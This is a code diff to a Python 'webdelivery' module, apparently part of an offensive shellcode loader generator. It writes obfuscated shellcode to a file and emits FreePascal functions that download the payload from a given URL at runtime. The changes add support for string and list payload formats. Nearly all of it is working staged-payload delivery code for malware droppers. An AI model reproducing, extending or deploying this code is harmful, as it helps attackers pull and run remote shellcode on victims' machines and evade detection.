@@ -1,6 +1,5 @@
 import random
 import string
-from c.utils.formatters import *
 
 class webdelivery:
 
@@ -10,9 +9,13 @@ class webdelivery:
             outfile = arguments['outfile']
         else:
             outfile = 'output.txt'
-        shellcodetype = type(shellcode).__name__
-        if shellcodetype == 'bytes':
+        self.shellcodetype = type(shellcode).__name__
+        if self.shellcodetype == 'bytes':
             open(outfile, 'wb').write(shellcode)
+        elif self.shellcodetype == 'str':
+            open(outfile, 'w').write(shellcode)
+        elif self.shellcodetype == 'list':
+            open(outfile, 'w').write('\n'.join(shellcode))
         print(f'Writing obfuscated shellcode to {outfile}')
         if 'url' in arguments:
             self.url = arguments['url']
@@ -21,7 +24,7 @@ class webdelivery:
             exit(0)
 
     def imports(self) -> list[str]:
-        return ['fphttpclient', 'ssockets']
+        return ['fphttpclient', 'ssockets', 'StrUtils']
 
     def compilerOptions(self) -> list[str]:
         return ['-gl', '-gh', '-Criot']
@@ -30,7 +33,8 @@ class webdelivery:
         return shellcodestring.format(shellcode=f'{self.name}()')
 
     def codeblock(self) -> str:
-        return f"""
+        if self.shellcodetype == 'bytes':
+            return f"""
 function {self.name}: TBytes;
 var
     client: TFPHttpClient;
@@ -47,5 +51,26 @@ begin
         stream.Free;
         client.free;
     end;
+end;
+"""
+
+        elif self.shellcodetype == 'str':
+            return f"""
+function {self.name}: String;
+
+begin
+    result := TFPHTTPClient.SimpleGet('{self.url}');
+end;
+"""
+
+        elif self.shellcodetype == 'list':
+            return f"""
+function {self.name}: TStringArray;
+var
+    responseString: String;
+
+begin
+    responseString := TFPHTTPClient.SimpleGet('{self.url}');
+    result := responseString.Split([#10]);
 end;
 """
